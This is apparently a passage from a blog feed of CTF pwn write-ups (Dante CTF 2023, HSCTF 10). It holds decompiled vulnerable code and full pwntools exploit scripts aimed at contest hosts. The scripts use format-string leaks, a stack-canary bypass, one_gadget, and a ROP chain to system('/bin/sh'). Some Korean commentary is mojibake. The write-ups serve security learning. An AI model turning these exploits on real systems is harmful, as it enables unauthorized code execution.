class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *src = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Notebook position [1-5]: &quot;</span>);</span><br><span class="line">  idx = read_int() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( souls[idx] )                           </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid slot!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = <span class="built_in">malloc</span>(<span class="number">68uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Soul name: &quot;</span>);</span><br><span class="line">      read_string(src, <span class="number">0x20</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( src[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(dest-&gt;name, src, <span class="number">0x20</span>uLL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Circle where I found him/her [1-9]: &quot;</span>);</span><br><span class="line">        v2 = read_int();</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          dest-&gt;num = v2;</span><br><span class="line">          <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;When I met him/her [dd/Mon/YYYY]: &quot;</span>);</span><br><span class="line">          read_string(src, <span class="number">0x60</span>uLL);            <span class="comment">// bof</span></span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(src) != <span class="number">11</span> &amp;&amp; !sanitize_date(src) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid date!\n&quot;</span>);</span><br><span class="line">            _exit(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">strncpy</span>(dest-&gt;date, src, <span class="number">12uLL</span>);</span><br><span class="line">          souls[idx] = dest;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Soul registered!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid circle!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid name!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid position!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./notebookp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.dantectf.it&#x27;</span>, <span class="number">31530</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./notebookp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, name, num, date</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, date)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, name, num, date</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, date)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx)) <span class="comment"># fsb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4ë²ˆ</span></span><br><span class="line"><span class="comment"># libc, pie, stack </span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span> , <span class="string">b&#x27;aa/sss/%3$p&#x27;</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;/0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span>, <span class="string">b&quot;aa/sss/%9$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;/0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary @ &#x27;</span> +<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">date = <span class="string">b&#x27;vv/vvv/1234&#x27;</span></span><br><span class="line">date += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">date += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(date))</span><br><span class="line">date += p64(canary)</span><br><span class="line">date += p64(<span class="number">0</span>)</span><br><span class="line">date += p64(libc.address + one_gadget[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>, <span class="number">1</span>, date)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCTF 10 2023 Write ups (all pwn)</title>
      <link href="/230609-hsctf102023-PWN/"/>
      <url>/230609-hsctf102023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1984">https://ctftime.org/event/1984</a></li></ul><h2 id="doubler-228-solves-x2F-354-points"><a href="#doubler-228-solves-x2F-354-points" class="headerlink" title="doubler (228 solves &#x2F; 354 points)"></a>doubler (228 solves &#x2F; 354 points)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">fgets(buffer, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="type">int</span> val = atoi(buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val: %i\n&quot;</span>, val);</span><br><span class="line"><span class="keyword">if</span> (val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: no negative numbers allowed!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> doubled = <span class="number">2</span> * val;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Doubled: %i\n&quot;</span>, doubled);</span><br><span class="line"><span class="keyword">if</span> (doubled == <span class="number">-100</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>The range of <code>int</code> is <code>â€“2,147,483,648 ~ 2,147,483,647</code>.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ ./chall</span><br><span class="line">Input: 2147483647</span><br><span class="line">Doubled: -2</span><br><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ ./chall</span><br><span class="line">Input: 2147483598</span><br><span class="line">Doubled: -100</span><br><span class="line">flag&#123;fake&#125;</span><br><span class="line">[jir4vvit@<span class="built_in">arch</span> doubler]$ nc doubler.hsctf.com 1337</span><br><span class="line">Input: 2147483598</span><br><span class="line">Doubled: -100</span><br><span class="line">flag&#123;double_or_nothing_406c561&#125;</span><br></pre></td></tr></table></figure><h2 id="ed-161-solves-x2F-407-points"><a href="#ed-161-solves-x2F-407-points" class="headerlink" title="ed (161 solves &#x2F; 407 points)"></a>ed (161 solves &#x2F; 407 points)</h2><p>You can find overflow like below. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line">fgets(input, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><p>And there is <code>flag()</code> so letâ€™s retrun to <code>flag()</code>. </p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ed.hsctf.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;f&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p.sendline(payload))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;real_programmers_use_butterflies&#125;</span><br></pre></td></tr></table></figure><h2 id="cat-145-solves-x2F-418-points"><a href="#cat-145-solves-x2F-418-points" class="headerlink" title="cat (145 solves &#x2F; 418 points)"></a>cat (145 solves &#x2F; 418 points)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buffer);</span><br></pre></td></tr></table></figure><p>format string bug</p><h3 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./chall&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;cat.hsctf.com&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">b = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">p.sendline(<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span>.encode())</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">b += p32(<span class="built_in">int</span>(p.recvline(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(b[b.index(<span class="string">b&quot;flag&#123;&quot;</span>):b.index(<span class="string">b&quot;&#125;&quot;</span>) + <span class="number">1</span>].decode())</span><br></pre></td></tr></table></figure><p>Actually, I got the flag without writing any code. I got this solved code from discord. :)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%10$p %11$p %12$p %13$p %14$p </span><br><span class="line">flag&#123;cats_go_meow&#125;</span><br></pre></td></tr></table></figure><h2 id="ex-90-solves-x2F-454-points"><a href="#ex-90-solves-x2F-454-points" class="headerlink" title="ex (90 solves &#x2F; 454 points)"></a>ex (90 solves &#x2F; 454 points)</h2><p>simple rop.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> input[<span class="number">24</span>];</span><br><span class="line">fgets(input, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><p>You have to get libc version first by leaking libc address first. and then, just ROP!</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ex&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ex.hsctf.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ex&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.31-0ubuntu9.9_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4014f3</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4014f1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0x41414141</span>)</span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?\n?\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0x41414141</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_wonder_if_there&#x27;s_an_emacs_command_for_writing_pwn_exploits?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HSCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Sentence To Hell (Full Relro)</title>
      <link href="/230608-dantectf2023-sentence_to_hell/"/>
      <url>/230608-dantectf2023-sentence_to_hell/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>Name a soul you want to send to hell and weâ€™ll handle the sentence.<br>Author: lillo<br>Easy<br><code>challs.dantectf.it:31531/tcp</code></p></blockquote><ul><li>[32 solves &#x2F; 420 points]</li></ul><p>POXXì¸ê°€ HCAMPì— ì´ëŸ° ë¬¸ì œë¥¼ ì¶œì œí•˜ë ¤ê³  í–ˆì—ˆë˜ ê¸°ì–µì´ ë‚œë‹¤. ì›ê°€ì ¯ì€ ìŠ¤íƒ ìƒí™©ì— ì˜í–¥ì„ ë§Žì´ ë°›ëŠ”ë‹¤ëŠ” ì‚¬ì‹¤ì„ ìƒê¸°ì‹œí‚¬ ìˆ˜ ìžˆëŠ” ì¢‹ì€ ë¬¸ì œì˜€ë‹¤. (ìš°ë¶„íˆ¬ 22.04ì—ì„œë„ ì›ê°€ì ¯ì´ ì‚¬ìš©ê°€ëŠ¥í•˜ë‹¤ë‹ˆ)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë„ì»¤íŒŒì¼ì´ ì£¼ì–´ì¡Œê¸° ë•Œë¬¸ì— patchelfë¶€í„° ì§„í–‰í•´ì¤¬ë‹¤. í™˜ê²½ì€ ìš°ë¶„íˆ¬ 22.04ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *addr; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 value[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  value[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please, tell me your name: &quot;</span>);</span><br><span class="line">  fgets(your_name, <span class="number">12</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  your_name[<span class="built_in">strcspn</span>(your_name, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(your_name);                            <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; give me a soul you want to send to hell: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, value);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;and in which circle you want to put him/her: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;addr);</span><br><span class="line">  getchar();</span><br><span class="line">  *addr = value[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done, bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>your_name</code> ë³€ìˆ˜ëŠ” bss ì˜ì—­ì— ì¡´ìž¬í•œë‹¤. ê¸€ìžìˆ˜ë¥¼ 11ìžê¹Œì§€ë§Œ ì ì„ ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— (null í¬í•¨í•˜ë©´ 12ìž) ì£¼ì†Œë¥¼ leakí•˜ëŠ” ë°ì— ì“¸ ìˆ˜ ìžˆë‹¤. ê·¸ë¦¬ê³  ì•„ëž˜ì™€ ê°™ì´ ìž„ì˜ì“°ê¸°ê°€ ì¡´ìž¬í•œë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001375                 mov     rax, [rbp+value]</span><br><span class="line">.text:0000000000001379                 mov     rdx, [rbp+addr]</span><br><span class="line">.text:000000000000137D                 mov     [rdx], rax</span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ Full Relroì´ê¸° ë•Œë¬¸ì— ë®ì„ ìˆ˜ ìžˆëŠ” êµ¬ê°„ì´ ë§Žì§€ ì•Šë‹¤. ëŒ€í‘œì ìœ¼ë¡œ gotë¥¼ ë®ì§€ ëª»í•œë‹¤. ì´ëŸ´ìˆ˜ë¡ ì›ê°€ì ¯ì˜ ì¡´ìž¬ë¥¼ ë– ì˜¬ë ¤ì•¼ í•œë‹¤.</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit 1"></a>Exploit 1</h2><ol><li>stack, pie leak</li><li>stack retë¥¼ <code>_start</code>ë¡œ ë®ì–´ í•œ ë²ˆ ë” ì‹¤í–‰ë˜ë„ë¡ í•¨</li><li>libc, stack leak</li><li>one_gadget ì˜¤í”„ì…‹ ê³„ì‚° í›„ stack retë¥¼ one_gadget[0]ìœ¼ë¡œ ë®ê¸°</li></ol><p>ì›ëž˜ í•œ ë²ˆë§Œì— stack retë¥¼ one_gadgetìœ¼ë¡œ ë®ì„ ìˆ˜ 